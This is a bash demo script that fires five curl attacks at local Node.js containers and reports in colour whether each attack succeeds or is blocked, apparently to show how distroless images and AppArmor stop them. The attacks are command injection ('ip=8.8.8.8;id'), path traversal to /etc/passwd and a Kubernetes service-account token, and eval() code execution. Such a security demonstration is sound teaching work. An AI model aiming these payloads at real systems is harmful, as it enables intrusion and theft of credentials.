#!/bin/bash
# Run the demo attacks against one of the Node.js containers.
#
# Color legend (from the DEFENDER's point of view):
#   RED   = attack SUCCEEDED  (HTTP 2xx/3xx) -> bad
#   GREEN = attack BLOCKED    (HTTP >= 400)  -> good
# The color is derived from the container's actual HTTP response, so the same
# attack turns red on app-classic and green on app-distroless automatically.

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

usage() {
  cat <<EOF
Usage: $0 <target> [attack numbers...]

  <target> can be the SERVICE NAME or the PORT:
    app-classic              -> 6661   (classic Node image: has /bin/sh)
    app-distroless           -> 6662   (distroless: no shell)
    app-distroless-hardened  -> 6663   (distroless + AppArmor)

  [attack numbers] (optional) selects which attacks to run (default: all):
    1  Command Injection
    2  Path Traversal - /etc/passwd
    3  Path Traversal - Kubernetes token
    4  Path Traversal - planted /etc/come-to-code.conf (AppArmor blacklist gap)
    5  Arbitrary Code Execution via eval()

  Examples:
    $0 app-distroless
    $0 app-distroless-hardened 2 3     # the "AppArmor victory" beat
    $0 app-distroless-hardened 4       # the blacklist-gap twist
    $0 app-distroless-hardened 5       # the wrong-layer twist
EOF
  exit 1
}

[ $# -eq 0 ] && usage

case "$1" in
  app-classic)             PORT=6661 ;;
  app-distroless)          PORT=6662 ;;
  app-distroless-hardened) PORT=6663 ;;
  -h|--help)               usage ;;
  [0-9]*)                  PORT="$1" ;;
  *) echo "Unknown target: '$1'"; echo; usage ;;
esac
TARGET="$1"; shift
SELECTION=("$@")
[ ${#SELECTION[@]} -eq 0 ] && SELECTION=(1 2 3 4 5)

# run <title> <description> <curl args...>
run() {
  local title="$1" desc="$2"; shift 2
  echo -e "\n${BOLD}--- ${title} ---${NC}"
  echo -e "${DIM}${desc}${NC}"
  local tmp code body
  tmp=$(mktemp)
  code=$(curl -s -o "$tmp" -w '%{http_code}' "$@")
  body=$(head -n 8 "$tmp")
  rm -f "$tmp"
  if [ -z "$code" ] || [ "$code" = "000" ]; then
    echo -e "${YELLOW}${BOLD}[NO RESPONSE - is the container up? HTTP ${code}]${NC}"
    echo -e "${DIM}${body}${NC}"
  elif [ "$code" -ge 200 ] && [ "$code" -lt 400 ]; then
    echo -e "${RED}${BOLD}[ATTACK SUCCEEDED - HTTP ${code}]${NC}"
    echo -e "${RED}${body}${NC}"
  else
    echo -e "${GREEN}${BOLD}[ATTACK BLOCKED - HTTP ${code}]${NC}"
    echo -e "${GREEN}${body}${NC}"
  fi
}

attack_1() {
  run "1. Command Injection  (/attack/command-injection)" \
      "Injects a shell command into an unsanitized exec() call." \
      -G "http://localhost:${PORT}/attack/command-injection" --data-urlencode "ip=8.8.8.8;id"
}
attack_2() {
  run "2. Path Traversal / LFI  (/attack/path-traversal)" \
      "Reads an arbitrary file through an unvalidated file path." \
      "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/passwd"
}
attack_3() {
  run "3. Path Traversal: Kubernetes token  (fake, mounted for the demo)" \
      "Same LFI, aimed at the service account token path." \
      "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token"
}
attack_4() {
  run "4. Path Traversal: planted config  (/etc/come-to-code.conf)" \
      "Same LFI on a harmless file the AppArmor blacklist forgot to deny." \
      "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/come-to-code.conf"
}
attack_5() {
  run "5. Arbitrary Code Execution  (/attack/eval-rce)" \
      "Executes arbitrary JavaScript through eval() (no shell required)." \
      -G "http://localhost:${PORT}/attack/eval-rce" --data-urlencode "code=1+1"
}

echo -e "${BOLD}=== Attacks against '${TARGET}' (port ${PORT}) ===${NC}"
echo -e "Legend: ${RED}${BOLD}RED = attack succeeded${NC} | ${GREEN}${BOLD}GREEN = attack blocked${NC}"

for n in "${SELECTION[@]}"; do
  case "$n" in
    1|2|3|4|5) "attack_$n" ;;
    *) echo -e "\n${YELLOW}Skipping unknown attack '$n' (valid: 1-5)${NC}" ;;
  esac
done

echo ""
